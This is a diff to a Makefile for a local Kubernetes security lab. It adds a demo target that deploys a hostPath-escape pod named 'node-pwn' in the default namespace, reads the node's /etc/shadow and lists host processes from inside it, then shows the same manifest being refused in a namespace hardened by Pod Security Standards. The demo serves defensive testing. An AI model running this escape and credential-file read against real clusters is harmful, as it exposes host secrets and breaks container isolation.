@@ -19,7 +19,7 @@ KUBECONFIG_SSF := $(HOME)/.kube/ssf-dev
 KUBECTL := kubectl --kubeconfig $(KUBECONFIG_SSF) --context kind-ssf-dev
 
 .PHONY: help setup up down logs build test lint semgrep scan scan-image sbom clean install-tools \
-        infra-up infra-plan infra-down infra-lint infra-proof
+        infra-up infra-plan infra-down infra-lint infra-proof attack-escape
 
 help: ## Affiche cette aide
 	@grep -E '^[a-zA-Z_-]+:.*?## ' $(MAKEFILE_LIST) | awk 'BEGIN{FS=":.*?## "}{printf "  \033[36m%-14s\033[0m %s\n", $$1, $$2}'
@@ -109,6 +109,25 @@ infra-lint: ## fmt, validate, checkov, trivy config — ce que la CI exécute su
 	done
 	docker run --rm -v "$(CURDIR):/src" -w /src bridgecrew/checkov -d infra/terraform --framework terraform --quiet --compact
 	trivy config --exit-code 1 --severity HIGH,CRITICAL infra/terraform
+
+attack-escape: ## Démo : évasion hostPath réussie dans 'default', refusée dans 'ssf' (durci par Terraform)
+	@echo "############################################################"
+	@echo "# 1) default — namespace SANS durcissement Terraform"
+	@echo "############################################################"
+	$(KUBECTL) apply -n default -f security/attacks/hostpath-escape.yaml
+	$(KUBECTL) -n default wait --for=condition=Ready pod/node-pwn --timeout=60s
+	@echo; echo ">> Lecture du /etc/shadow du NŒUD depuis le conteneur (3 lignes) :"
+	$(KUBECTL) -n default exec node-pwn -- sh -c 'head -3 /host/etc/shadow'
+	@echo; echo ">> Processus du nœud visibles depuis le pod (hostPID) :"
+	$(KUBECTL) -n default exec node-pwn -- sh -c 'ps -o pid,args | grep -m1 kubelet'
+	$(KUBECTL) delete -n default -f security/attacks/hostpath-escape.yaml
+	@echo; echo "############################################################"
+	@echo "# 2) ssf — namespace durci par Terraform (PSS restricted)"
+	@echo "############################################################"
+	@echo ">> Même manifeste, il doit être REFUSÉ à l'admission :"
+	-$(KUBECTL) apply -n ssf -f security/attacks/hostpath-escape.yaml
+	@echo; echo ">> Aucun pod node-pwn dans ssf :"
+	$(KUBECTL) -n ssf get pod node-pwn 2>&1 || true
 
 infra-proof: ## Preuve PSS : un pod root doit être refusé à l'admission dans le namespace ssf
 	$(KUBECTL) get namespaces ssf security --show-labels
